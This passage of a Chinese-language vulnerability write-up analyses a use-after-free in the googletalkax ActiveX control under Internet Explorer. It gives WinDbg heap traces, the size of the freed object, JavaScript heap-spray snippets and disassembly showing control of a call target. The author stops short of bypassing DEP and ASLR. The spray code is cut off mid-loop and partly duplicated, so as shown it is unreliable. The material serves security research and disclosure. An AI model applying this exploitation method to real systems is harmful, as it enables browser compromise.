     14d10ca5 8b471c     mov   eax,dword ptr [edi+1Ch] ds:002b:3dc19fcc=????????  
     0:007> !heap -p -a edi  
       address 3dc19fb0 found in  
       _DPH_HEAP_ROOT @ 461000  
       in free-ed allocation ( DPH_HEAP_BLOCK:     VirtAddr     VirtSize)  
                       3dbe1ac4:     3dc19000       2000  
       5f8290b2 verifier!AVrfDebugPageHeapFree+0x000000c2  
       77691564 ntdll!RtlDebugFreeHeap+0x0000002f  
       7764ac29 ntdll!RtlpFreeHeap+0x0000005d  
       775f34a2 ntdll!RtlFreeHeap+0x00000142  
       75f514ad kernel32!HeapFree+0x00000014  
       14d28310 googletalkax!DllUnregisterServer+0x0001d9f0  
       14d0e407 googletalkax!DllUnregisterServer+0x00003ae7  
       14d0218a googletalkax+0x0000218a  
       14d0572f googletalkax+0x0000572f  
       61d0fe01 +0x0000001d  
       61d24fd6 MSHTML!CBase::PrivateRelease+0x000000bc  
       61d0d8ee MSHTML!CTxtSite::Release+0x0000001a  
       61d0d986 MSHTML!CBase::ReleaseInternalRef+0x0000001f  
       5e6586d3 jscript9!Js::CustomExternalObject::Dispose+0x00000023  
       5e65869c jscript9!SmallFinalizableHeapBlock::DisposeObjects+0x00000134  
       5e659880 jscript9!HeapInfo::DisposeObjects+0x000000b0  
       5e659750 jscript9!Recycler::DisposeObjects+0x0000004a  
       5e6596fe jscript9!Recycler::FinishDisposeObjects+0x0000001a  
       5e74f64c jscript9!Recycler::CollectOnConcurrentThread+0x00000087  
       5e655f36 jscript9!DefaultRecyclerCollectionWrapper::ExecuteRecyclerCollectionFunction+0x00000026  
       5e655eeb jscript9!ThreadContext::ExecuteRecyclerCollectionFunctionCommon+0x0000003b  
       5e655e6d jscript9!ThreadContext::ExecuteRecyclerCollectionFunction+0x000000ad  
       5e656a46 jscript9!Recycler::DoCollectWrapped+0x00000079  
       5e7fc8dc jscript9!Recycler::Collect+0x0000004b  
       5e64c06d jscript9!Js::InterpreterStackFrame::Process+0x00001940  
       5e64c7ab jscript9!Js::InterpreterStackFrame::InterpreterThunk+0x000001ce  
     0:007> s -u 0x00000000 L?0xffffffff seansean7  
     0eebafa6 0073 0065 0061 006e 0073 0065 0061 006e s.e.a.n.s.e.a.n.  
     29e66f96 0073 0065 0061 006e 0073 0065 0061 006e s.e.a.n.s.e.a.n.  
     4b6c6f02 0073 0065 0061 006e 0073 0065 0061 006e s.e.a.n.s.e.a.n.  
     79700c0a 0073 0065 0061 006e 0073 0065 0061 006e s.e.a.n.s.e.a.n.  
     0:007> !heap -p -a 0eebafa6  
       address 0eebafa6 found in  
       _DPH_HEAP_ROOT @ 461000  
       in busy allocation ( DPH_HEAP_BLOCK:     UserAddr     UserSize -     VirtAddr     VirtSize)  
                      eec0208:     eeba7f0       80c -     eeba000       2000  
       5f828e89 verifier!AVrfDebugPageHeapAllocate+0x00000229  
       77690d96 ntdll!RtlDebugAllocateHeap+0x00000030  
       7764af0d ntdll!RtlpAllocateHeap+0x000000c4  
       775f3cfe ntdll!RtlAllocateHeap+0x0000023a  
       61df38ff MSHTML!CHtmRootParseCtx::NailDownChain+0x000004ba  
       61de7c59 MSHTML!CHtmRootParseCtx::EndElement+0x00000119  
       61de7b27 MSHTML!CHtmRootParseCtxRouter::EndElement+0x00000017  
       61dee7b2 MSHTML!CHtml5TreeConstructor::PopElement+0x000000b7  
       61f896b5 MSHTML!CTextInsertionMode::DefaultEndElementHandler+0x00000035  
       620fc85b MSHTML!CInsertionMode::HandleEndElementToken+0x0000003d  
       61df17f5 MSHTML!CHtml5TreeConstructor::HandleElementTokenInInsertionMode+0x00000026  
       61df16c8 MSHTML!CHtml5TreeConstructor::PushElementToken+0x000000a5  
       61f891f8 MSHTML!CHtml5Tokenizer::EmitElementToken+0x00000067  
       61f8a243 MSHTML!CHtml5Tokenizer::RCDATAEndTagName_StateHandler+0x000003bf  
       61deeec5 MSHTML!CHtml5Tokenizer::ParseBuffer+0x0000012c  
       61def19b MSHTML!CHtml5Parse::ParseToken+0x00000131  
       61dee707 MSHTML!CHtmPost::ProcessTokens+0x000006af  
       61de7f32 MSHTML!CHtmPost::Exec+0x000001e4  
       620b9a78 MSHTML!CHtmPost::Run+0x0000003d  
       620b99de MSHTML!PostManExecute+0x00000061  
       620c1e04 MSHTML!PostManResume+0x0000007b  
       61e4d397 MSHTML!CDwnChan::OnMethodCall+0x0000003e  
       61d0e101 MSHTML!GlobalWndOnMethodCall+0x0000016d  
       61d0db16 MSHTML!GlobalWndProc+0x000002e5  
       751262fa user32!InternalCallWinProc+0x00000023  
       75126d3a user32!UserCallWinProcCheckWow+0x00000109  
       751277c4 user32!DispatchMessageWorker+0x000003bc  
       7512788a user32!DispatchMessageW+0x0000000f  
       6366f668 IEFRAME!CTabWindow::_TabWindowThreadProc+0x00000464  
       636a25b8 IEFRAME!LCIETab_ThreadProc+0x0000037b  
       7531d6fc iertutil!_IsoThreadProc_WrapperToReleaseScope+0x0000001c  
       5f893991 IEShims!NS_CreateThread::DesktopIE_ThreadProc+0x00000094  
可以看到ActiveX控件和JavaScript代码使用了相同的堆区，因此利用起来就方便多了。
### 0x05 确定堆分配的大小
接着我们还需要确定此释放对象的大小，这里要禁用掉除了“usermode stack dbs”外所有的Gflags设置，同时还要在崩溃处下个断点：
     Bu googletalkax!DllUnregisterServer+0x6385 "!heap -p -a edi;g"
     70760ca5 8b471c     mov   eax,dword ptr [edi+1Ch] ds:002b:078f8a44=a48a8f07  
     0:005> !heap -p -a edi  
       address 078f8a28 found in  
       _HEAP @ 730000  
        HEAP_ENTRY Size Prev Flags  UserPtr UserSize - state  
         078f8a10 000d 0000 [00]  078f8a28  00050 - (busy)  
          ? googletalkax!DllUnregisterServer+43db0  
因此释放掉的对象大小为0x50字节。
### 0x06 堆喷
然后，我们利用堆喷在释放内存上重新写入想要的数据，此步骤要在与释放对象交互前完成。不过在此之前我们需要先填充IE进程中的那些堆碎片，这个过程会分配大量相同大小的堆。
我们通过下述JS函数来实现堆喷。其中，赋值的0x50字节子字符串需要减去4字节的BSTR对象头部以及2字节的终止标识，又因为存储的是Unicode格式，所以还要除以2。最终，该字符串会正好占用0x50字节的内存空间。
     var largechunk = unescape("sean3");  
     var spray = new Array();  
     function dospray()  
     {  
          while (largechunk.length   
     var largechunk = unescape("%u2030%u2228");  
     var spray = new Array();  
     function dospray()  
     {  
          while (largechunk.length   
代码通过DEPS堆喷能确保将内存0x20302228处的对应值置为0x6161615d。
之后，“onmessage”方法的回调函数中会进行对象的释放操作，并通过堆喷分配大量相同大小（0x50字节）的字符串对象来重写此释放内存。这时该释放指针指向的内容就变成了新分配的字符串对象，其中包含了指向0x20302228的指针。当访问此释放指针时，同样会执行下述的汇编代码：
     13e70ca5 8b471c        mov   eax,dword ptr [edi+1Ch]  
     13e70ca8 8b30          mov   esi,dword ptr [eax] 
     13e70caa 8d850cffffff  lea   eax,[ebp-0F4h]  
     13e70cb0 50            push  eax  
     13e70cb1 8d45e4        lea   eax,[ebp-1Ch]  
     13e70cb4 50            push  eax  
     13e70cb5 e8768e0000    call  googletalkax!DllUnregisterServer+0xf210 (13e79b30)  
     13e70cba 8b4f1c        mov   ecx,dword ptr [edi+1Ch]  
     13e70cbd 83c408        add   esp,8  
     13e70cc0 50            push  eax  
     13e70cc1 ff5604        call  dword ptr [esi+4]  
不同的是之前释放指针指向的EDI+1Ch中的无效内容现在被替换成了0x20302228，这个值会被保存到EAX寄存器中，而后0x20302228内存处的值又被赋值给了ESI寄存器，即通过DEPS堆喷设置的0x6161615d。最后程序会调用ESI+4指向的地址，也就是我们可控的0x61616161地址处的值，从而证明了代码的执行。
### 0x08 后续工作
后续的工作就是要把此漏洞转换成真正可利用的exploit，不过由于程序存在DEP和ASLR保护，我们还需要借此实现相关的infoleak，我之前花了些时间试图借助https://media.blackhat.com/bh-us-12/Briefings/Serna/BH_US_12_Serna_Leak_Era_Slides.pdf
中的内容来寻找灵感，但最终还是没能再继续下去。你要是有什么idea欢迎联系我一起讨论，如果能找到将这个bug转换成infoleak的方法，那么我会非常感兴趣的。
* * *